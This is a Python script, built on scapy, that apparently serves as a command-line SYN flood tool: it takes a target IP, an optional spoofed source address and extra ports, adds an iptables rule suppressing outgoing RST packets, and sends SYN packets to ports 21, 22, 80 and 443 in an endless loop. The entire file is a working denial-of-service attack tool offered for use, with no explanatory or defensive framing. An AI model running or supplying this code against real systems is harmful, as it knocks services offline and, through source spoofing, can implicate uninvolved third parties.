from scapy.all import IP, TCP, send, RandShort
from subprocess import Popen, PIPE, call
import argparse
import platform
import sys

g_target_ip = ""
g_dest_ports = [21, 22, 80, 443]

"""
	This function configures iptables to prevent the kernel from sending RSTs.
"""
def setup_config():
	print("[*] Configuring iptables to preven RSTs from being sent.")
	# Check to see if script is running on linux
	if (platform.system() == "Linux"):
		# Disable RST from kernel
		firewall = "iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
		Popen([firewall], shell=True, stdout=PIPE)

	# To-do
	if (platform.system() == "Windows"):
		print("[#] Please ensure RSTs are not being sent by kernel")

"""
	This function adds user defined ports to the list of ports to be scanned.
"""
def append_ports(additional_ports):
	global g_dest_ports
	for specific_port in additional_ports:
		if not specific_port in g_dest_ports:
			g_dest_ports.append(specific_port)

"""
	This function creates the SYN packet and sends it to all
	the specified ports.
"""
def syn_flooder(source_ip):
	global g_dest_ports
	print("[*] Sending SYNs to the following ports:", *g_dest_ports)

	# Create the IP layer
	if (source_ip == None):
		ip = IP(dst = g_target_ip)
	else:
		ip = IP(src = source_ip, dst = g_target_ip)

	# Create the SYN
	tcp = TCP(sport=RandShort(), dport=g_dest_ports, flags="S", seq=42)

	print("[*] Starting SYN flood")

	# Create the packet and continously send it to all the specified ports
	pkt = ip/tcp
	while True:
		send(pkt, verbose = False)


def main():
	global g_target_ip

	# Get the args
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", help="Specify the target's IP")
	parser.add_argument("-s", help="Specify an IP to be spoofed as source")
	parser.add_argument("-c", nargs="+", type=int, help="Specify a list of additional ports you want to send syns to.")
	args = parser.parse_args()

	g_target_ip = args.t

	if (g_target_ip == None):
		sys.exit("[#] Please specify the target's IP address.\n[#] Exiting")

	if (args.c != None):
		append_ports(args.c)

	print("[*] Target IP: ", g_target_ip)

	syn_flooder(args.s)

if __name__ == "__main__":
	main()